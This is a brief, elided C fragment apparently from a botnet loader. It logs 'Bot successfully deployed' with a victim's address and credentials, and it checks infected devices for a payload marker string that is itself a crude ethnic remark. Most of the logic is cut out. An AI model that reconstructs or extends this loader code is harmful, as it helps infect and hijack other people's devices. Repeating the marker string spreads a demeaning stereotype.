...
void connection_close(struct connection *conn)
{
    ...
    if(conn->open)
    {
        ...
        if(conn->success)
        {
            ...
            fprintf(stderr, "\x1B[37m[\x1B[31m+\x1B[37m]\x1B[32mBot successfully deployed \x1B[31m---\x1B[33m>\x1B[0m\x1B[33m%d.%d.%d.%d:\x1B[31m%d \x1B[34m%s:\x1B[36m%s %s %d\x1B[0m\n",
...
int connection_verify_payload(struct connection *conn)
{
    ...
    if(util_memsearch(conn->rdbuf, offset, "gosh that chinese family at the other table sure ate alot", 57) == -1)
        return offset;
    else
        return 255 + offset;
}
